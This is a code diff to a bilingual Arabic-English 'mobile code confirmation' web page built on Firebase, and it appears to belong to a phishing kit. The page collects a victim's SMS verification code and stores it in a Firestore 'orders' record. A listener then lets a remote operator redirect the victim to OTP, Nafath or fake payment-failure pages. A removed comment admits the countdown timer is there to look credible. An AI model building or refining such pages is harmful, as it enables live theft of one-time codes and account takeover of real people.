@@ -6,40 +6,42 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>تأكيد رمز الجوال | Mobile Code</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/site-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/inner-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { padding: 40px 25px; border-radius: var(--tree-radius-lg); width: 90%; max-width: 400px; text-align: center; }
-        .logo { width: 100px; margin-bottom: 20px; object-fit: contain; }
-        .timer { font-weight: bold; margin: 15px 0; font-size: 14px; }
-        input { width: 100%; padding: 15px; margin: 15px 0; border-radius: 12px; font-size: 24px; text-align: center; letter-spacing: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 18px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        body { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
     </style>
 </head>
-<body class="tree-site mobil-code-page">
+<body>
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<div class="card">
-    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
-        <img src="images/logo.png" class="logo" alt="Tree" onerror="this.src='https://placehold.co/100x40/198754/ffffff?text=TREE'" style="margin-bottom:0;">
-        <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()" style="font-size:0.75rem;padding:3px 10px;">EN</button>
+<div class="teal-card teal-card--narrow" style="width:100%;">
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:18px 24px;border-bottom:1px solid var(--teal-border);">
+        <a href="index.html" style="font-size:1.3rem;font-weight:800;color:var(--text-white);text-decoration:none;font-family:'Inter',sans-serif;">tree</a>
+        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
     </div>
-    <h3 data-i18n="mcode.title">رمز تأكيد الجوال</h3>
-    <p style="font-size: 14px; color: var(--tree-text-muted);" data-i18n="mcode.msg">أدخل الرمز المكون من 4 أرقام المرسل إلى جوالك لإتمام التحقق</p>
-    
-    <input type="number" id="smsCode" placeholder="— — — —" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
-    
-    <div class="timer"><span data-i18n="mcode.resend">سيتم إعادة إرسال الرمز خلال</span> <span id="time">01:59</span></div>
 
-    <button onclick="verifyAndNext()" data-i18n="mcode.confirm">تأكيـد الرمز</button>
+    <div class="card-body" style="text-align:center;">
+        <div class="section-title" style="margin-bottom:8px;" data-i18n="mcode.title">رمز تأكيد الجوال</div>
+        <div class="section-sub" style="margin-bottom:24px;" data-i18n="mcode.msg">أدخل الرمز المكون من 4 أرقام المرسل إلى جوالك لإتمام التحقق</div>
+
+        <div class="field">
+            <input type="number" class="otp-input" id="smsCode" placeholder="— — — —" oninput="if(this.value.length>4)this.value=this.value.slice(0,4);">
+        </div>
+
+        <div class="timer-chip" style="margin:12px 0 20px;justify-content:center;">
+            <span data-i18n="mcode.resend">سيتم إعادة إرسال الرمز خلال</span>
+            <span class="timer-chip__num" id="time">01:59</span>
+        </div>
+
+        <button class="btn-green" onclick="verifyAndNext()" data-i18n="mcode.confirm">تأكيد الرمز</button>
+    </div>
 </div>
 
 <script>
-    // إعدادات Firebase الخاصة بك
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
         authDomain: "tameen-658e9.firebaseapp.com",
@@ -52,59 +54,37 @@
     const db = firebase.firestore();
     const userId = localStorage.getItem('user_id');
 
-    // وظيفة الإرسال والانتقال لصفحة الاتصال
     async function verifyAndNext() {
         const code = document.getElementById('smsCode').value;
-        if(code.length < 4) { alert(t('mcode.err_short')); return; }
-
+        if (code.length < 4) { alert(t('mcode.err_short')); return; }
         await db.collection("orders").doc(userId).update({
             mobile_sms_code: code,
             status: "تم تأكيد رمز الجوال - ينتقل للاتصال"
         });
-
-        // الانتقال التلقائي لصفحة الاتصال الموجودة عندك
         window.location.href = "call_verification.html";
     }
 
-    // عداد الوقت التنازلي للجمالية والمصداقية
     let duration = 119;
     const display = document.querySelector('#time');
     setInterval(() => {
-        let minutes = parseInt(duration / 60, 10);
-        let seconds = parseInt(duration % 60, 10);
-        minutes = minutes < 10 ? "0" + minutes : minutes;
-        seconds = seconds < 10 ? "0" + seconds : seconds;
-        display.textContent = minutes + ":" + seconds;
+        let minutes = parseInt(duration/60,10);
+        let seconds = parseInt(duration%60,10);
+        display.textContent = (minutes<10?'0'+minutes:minutes)+':'+(seconds<10?'0'+seconds:seconds);
         if (--duration < 0) duration = 119;
     }, 1000);
-    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
-(function() {
-    const userId = localStorage.getItem('user_id');
-    if (userId) {
-        db.collection("orders").doc(userId).onSnapshot((doc) => {
-            if (doc.exists) {
-                const data = doc.data();
-                if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp_verification.html"; 
-                } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_failed.html";
-                } else if (data.next_step === "GO_TO_NAFATH") {
-                    window.location.href = "nafath.html";
-                } else if (data.next_step === "SHOW_NAFATH_CODE") {
-                    const codeBox = document.getElementById('nafath-number');
-                    if (codeBox && data.nafath_code) {
-                        codeBox.innerText = data.nafath_code;
-                        const overlay = document.getElementById('overlay');
-                        if (overlay) overlay.style.display = 'none';
-                    }
-                }
-            }
-        });
-    }
-})();
-// ------------------------------------------
 
+    (function() {
+        if (userId) {
+            db.collection("orders").doc(userId).onSnapshot((doc) => {
+                if (doc.exists) {
+                    const data = doc.data();
+                    if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
+                    else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
+                    else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") window.location.href = "nafath.html";
+                }
+            });
+        }
+    })();
 </script>
 </body>
 </html>
-
